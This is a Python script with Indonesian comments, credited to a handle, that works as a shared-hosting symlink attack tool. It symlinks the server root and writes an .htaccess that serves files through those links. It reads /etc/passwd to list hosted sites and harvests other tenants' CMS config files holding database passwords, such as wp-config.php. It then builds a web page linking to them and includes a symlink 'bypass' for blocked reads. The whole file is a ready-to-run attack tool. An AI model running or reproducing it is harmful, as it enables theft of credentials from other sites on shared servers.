#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import os
import sys

print("======= Pyhost | by: byt3_ver!fy =======")

# buat folder kerja
workdir = 'pyhost_py'
if not os.path.exists(workdir):
    os.makedirs(workdir, exist_ok=True)
os.chdir(workdir)

# coba buat symlink 'pyhost' dan 'pyhost.txt' yang menunjuk ke root '/'
# (beberapa environment mungkin tidak mengizinkan symlink -> tangani error)
for link_name in ('pyhost', 'pyhost.txt'):
    try:
        if not os.path.islink(link_name) and not os.path.exists(link_name):
            os.symlink('/', link_name)
    except (OSError, NotImplementedError) as e:
        # fallback ke command ln (jika tersedia) - jika gagal, lanjut tanpa symlink
        try:
            os.system(f"ln -s / {link_name}")
        except Exception:
            pass

title = (
    "<title>Pyhost | By: byt3_ver!fy</title>"
    "<center><h1 style='color:grey;'>Pyhost</h1>"
    "<h2 style='color:red;'>By: byt3_ver!fy</h2><table>"
)
htc = (
    "Options Indexes FollowSymlinks\n"
    "DirectoryIndex pyhost.phtml\n"
    "AddType txt .phtml .phtml\n"
    "AddHandler txt .phtml\n"
)

# tulis .htaccess
try:
    with open(".htaccess", "w", encoding="utf-8") as m:
        m.write(htc)
    print("[+] Succeeded write .htaccess")
except OSError as e:
    print(f"[-] Failed to write .htaccess: {e}")

# daftar file konfigurasi yang dicari
configs = [
    "/wp-config.php",
    "/configuration.php",
    "/config/koneksi.php",
    "/db.php",
    "/includes/config.php",
    "/forum/config.php",
    "/sites/default/settings.php",
    "/config/settings.inc.php",
    "/app/etc/local.xml",
    "/admin/config.php",
    "/application/config/database.php",
]

# baca /etc/passwd
try:
    with open("/etc/passwd", "r", encoding="utf-8", errors="ignore") as passwd:
        read = passwd.read()
    print("[+] /etc/passwd found\n")
except OSError as e:
    print(f"[-] Failed to open /etc/passwd: {e}")
    read = ""

# cari pola vhosts di /etc/passwd (sesuaikan regex bila perlu)
# pola asli: '/vhosts/\w+.\w+.\w{2,3}\b' -> perbaikan untuk menerima dash/dot
r = re.findall(r'/vhosts/[\w\.-]+\.[\w\.-]+\.\w{2,3}\b', read)

# buat file phtml
try:
    htm = open("pyhost.phtml", "w", encoding="utf-8")
    htm.write(title + "\n")
except OSError as e:
    print(f"[-] Failed to create pyhost.phtml: {e}")
    sys.exit(1)

sites = []
for vsite in r:
    vsite = vsite.replace("/vhosts/", "")
    sites.append(vsite)

number = 1

# helper untuk mengecek apakah konten berisi salah satu indikator
def contains_any(text, needles):
    return any(needle in text for needle in needles)

for site in sites:
    for config in configs:
        # bangun path yang mengacu pada symlink pyhost.txt (seperti skrip asli)
        # contoh: pyhost.txt/var/www/vhosts/<site>/httpdocs/wp-config.php
        target_path = "pyhost.txt/var/www/vhosts/" + site + "/httpdocs" + config

        if os.path.exists(target_path):
            try:
                with open(target_path, "rb") as tf:
                    content_bytes = tf.read()
                # decode agar bisa dicek substring (abaikan error decoding)
                try:
                    target = content_bytes.decode("utf-8", errors="ignore")
                except Exception:
                    target = str(content_bytes)
            except OSError as e:
                print(f"[-] Failed to read {target_path}: {e}")
                target = ""
        else:
            # kalau file tidak ada, catat dan lanjut
            print(f"[-] Not found: {target_path}")
            target = ""

        # cek indikator konfigurasi/password/DB
        if target and contains_any(target, ["DB", "PASSWORD", "password", "db_", "DB_PASSWORD", "="]):
            # tulis baris hasil ke pyhost.phtml
            safe_href = target_path.replace(" ", "%20")
            try:
                htm.write(
                    "<tr><td style='color:grey;'>{}</td>"
                    "<td style='color:green;'>{}</td>"
                    "<td><a href='{}'><button style='background-color:#696969;border:#696969;color:green;'>Symlink !</button></a></td></tr>\n".format(
                        number, site, safe_href
                    )
                )
                number += 1
                print(f"[+] Succeeded get config: {target_path}")
            except Exception as e:
                print(f"[-] Failed to write entry for {target_path}: {e}")

        elif "No input file specified" in target:
            print("[-] No input file specified :(")
            print("[+] Attempting bypass with symlink")
            # buat symlink lokal <site>.txt -> target_path (jika file ada)
            linkname = f"{site}.txt"
            try:
                if os.path.exists(target_path) and not os.path.exists(linkname):
                    os.symlink(target_path, linkname)
                htm.write(
                    "<tr><td style='color:grey;'>{}</td>"
                    "<td style='color:green;'>{}</td>"
                    "<td><a href='pyhost.txt/{}'><button style='background-color:#696969;border:#696969;color:green;'>Symlink !</button></a></td></tr>\n".format(
                        number, site, linkname
                    )
                )
                number += 1
                print("[+] Bypass successfully created for", site)
            except OSError as e:
                print(f"[-] Failed to create bypass symlink for {site}: {e}")
        else:
            print(f"[-] Can't get a config for {site} {config}\n")

htm.write("</table></center>")
htm.close()
print("\n[+] Done. Open pyhost.phtml untuk melihat hasil.")
